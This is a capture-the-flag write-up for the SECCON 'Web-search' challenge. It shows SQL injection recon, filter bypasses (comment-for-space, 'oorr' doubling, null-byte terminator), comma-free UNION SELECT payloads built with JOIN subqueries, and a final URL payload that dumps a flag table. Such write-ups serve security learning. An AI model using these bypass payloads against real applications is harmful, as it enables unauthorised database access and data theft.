## SECCON Web-search Writeup


The challenge opens up with a search box and some content on the articles page. We can use some strings in the text box to search for the articles with that word/letter in it. 

### Recon:

 - First, check if it’s a sqli challenge.
 - Give a ‘(single quote)  -> throws an error. 
 - Given a “(double quote) - > no result.
 - Given a ) -> some results
 - I.e the keyword is enclosed within ‘ ‘ (single brackets). 

Checking for bypasses and formulating the payload:

The first thing to try for a sqli - ‘ or 1=1 -- -

### Results found : 
 - Spaces are stripped
 - Or is escaped
 - Comments did not work

Tried with some other payloads and found in addition to those these are also blocked.
- Pipe is replaced with nothing
- And is replaced with nothing
- % is replaced with nothing
- %0a also did not work
- Worst of all commas are also stripped

### Bypasses:
If space is blocked we can use /**/ or use brackets().

Or is escaped rather replaced with nothing so we can bypass it like this “oorr” only once "or" will be escaped leaving us with "or"
End the statement with ";" then %00 (null byte) to end the command there
No need of pipe since we can use "or"

### Payload:
              We know that it’s sqli - ‘/**/or/**/1=1;%00
Now we can get all the content from the current table. In that content we’ll get the first half of the flag and also a hint -> the next half is in the table flag

 So, we need to get the content from flag table. Cool , we can just do union select 1,2,3 … to find out no. of columns and then dump the database. But, the problem is we cannot use commas

So, we need to figure out a way to select the  same no. of columns on both sides of union. If you remember, the union selects or executes both the queries and the results are joined in the extra rows of the first table. So, if there’s a way to join two columns then we can join how many columns we want so that we can make it equal to the columns in the first command. That is possible and we just have to select what we want as a table and join them using join command
I have already tried select database() and got an error, that means the table has more than one column and also we need to get the data from flag table.
 Select * from table1 join table2 → general join tables syntax

Select * from (select 1) as a join (select 2) as b;
After encoding:
a’/**/union/**/select/**/*/**/from/**/(select/**/1)/**/as/**/a/**/join/**/(select/**/2)/**/as/**/b;%00

The above command select a table with two columns 1 and 2 with the content 1,2. All that now left is to find how many columns we need. From the above command’s result we’ll know that the table has more than 2 rows.Next try with 3 columns, then it’ll show the results. So, the table has/selects 3 columns. Now, time to dump the database.
We know that the table name is flag. We need to get the column name now.

Select * from (select * from (select group_concat(column_name) from information_schema.columns where table_schema=database()) as a join (select 2) as b) as c join (select 1) as d; 

	This will dump all the columns of the tables in that database. For more clarity you can dump it table wise just change table_schema to table_name=’<table_name>’. Now just get the column piece from the flag table you’ll get the other half also.

### Final payload:
http://web-search.chal.seccon.jp/?q=%27/**/union/**/select/**/*/**/from/**/(select/**/*/**/from/**/(select/**/piece/**/from/**/flag)/**/as/**/a/**/join/**/(select/**/2)/**/as/**/b)/**/as/**/c/**/join/**/(select/**/1)/**/as/**/d;%00
